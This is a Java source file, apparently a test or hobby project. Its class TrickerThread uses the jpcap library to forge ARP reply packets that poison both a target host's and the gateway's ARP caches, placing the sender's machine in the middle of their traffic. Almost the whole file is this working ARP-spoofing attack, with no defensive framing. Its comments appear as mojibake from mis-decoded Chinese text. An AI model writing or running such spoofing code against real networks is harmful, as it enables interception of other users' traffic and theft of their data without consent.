package test;

import java.net.InetAddress;
import jpcap.packet.*;
import jpcap.*;

public class TrickerThread extends Thread
{  
   
    private String targetIP;
   
    private String gateWayIP;
   
    private byte[] targetMAC;
   
    private byte[] gateWayMAC;
   
    private ARPPacket targetPacket;
   
    private ARPPacket gateWayPacket;
   
    private NetworkInterface device;
   
    private JpcapSender sender = null;
   
    public TrickerThread(NetworkInterface device, JpcapSender sender, String targetIP, String gateWayIP, byte[] targetMAC , byte[] gateWayMAC)
    {
      this.device = device;
      this.sender = sender;
         this.targetIP = targetIP;
         this.gateWayIP = gateWayIP;
         this.targetMAC = targetMAC;
         this.gateWayMAC = gateWayMAC;
        
         makePacket(); 
    }
   
   
    public void run()
    {
     
     sender.sendPacket(targetPacket);
     sender.sendPacket(gateWayPacket);
     System.out.println("��ƭ!!");
     try
     {
      Thread.sleep(200);
     }
     catch(Exception e)
     {
      System.out.println();
     }
    }
   
    private void makePacket()
    {
     
     
     
     targetPacket = new ARPPacket();//����Ŀ��������ARP��
  targetPacket.hardtype=ARPPacket.HARDTYPE_ETHER;
  targetPacket.prototype=ARPPacket.PROTOTYPE_IP;
  targetPacket.operation=ARPPacket.ARP_REPLY;//REPLY�ظ���ARP���ݰ�
  targetPacket.hlen=6;
  targetPacket.plen=4;
  targetPacket.sender_hardaddr=device.mac_address;//ԴMAC��ַ
  targetPacket.target_hardaddr=targetMAC;//Ŀ��MAC��ַ
  try
  {
   
      targetPacket.sender_protoaddr=InetAddress.getByName(gateWayIP).getAddress();
     
      targetPacket.target_protoaddr=InetAddress.getByName(targetIP).getAddress();
  }catch(Exception e)
  {
   
  }
  
  EthernetPacket ether=new EthernetPacket();
  ether.frametype=EthernetPacket.ETHERTYPE_ARP;
  
  ether.src_mac=device.mac_address;
  
  ether.dst_mac=targetMAC;
  
  targetPacket.datalink=ether;
  
  gateWayPacket = new ARPPacket();//�������ص�ARP���ݱ�
  gateWayPacket.hardtype=ARPPacket.HARDTYPE_ETHER;
  gateWayPacket.prototype=ARPPacket.PROTOTYPE_IP;
  gateWayPacket.operation=ARPPacket.ARP_REPLY;
  gateWayPacket.hlen=6;
  gateWayPacket.plen=4;
  gateWayPacket.sender_hardaddr=device.mac_address;//ԴMAC��ַ
  gateWayPacket.target_hardaddr=gateWayMAC;//Ŀ��MAC��ַ
  try
  {
   
      gateWayPacket.sender_protoaddr=InetAddress.getByName(targetIP).getAddress();
     
      gateWayPacket.target_protoaddr=InetAddress.getByName(gateWayIP).getAddress();
  }catch(Exception e)
  {
   
  }
    
  ether=new EthernetPacket();
  ether.frametype=EthernetPacket.ETHERTYPE_ARP;
  ether.src_mac=device.mac_address;//ԴMAC��ַ
  ether.dst_mac=gateWayMAC;//Ŀ��MAC��ַ
  gateWayPacket.datalink=ether;
  
    }  
}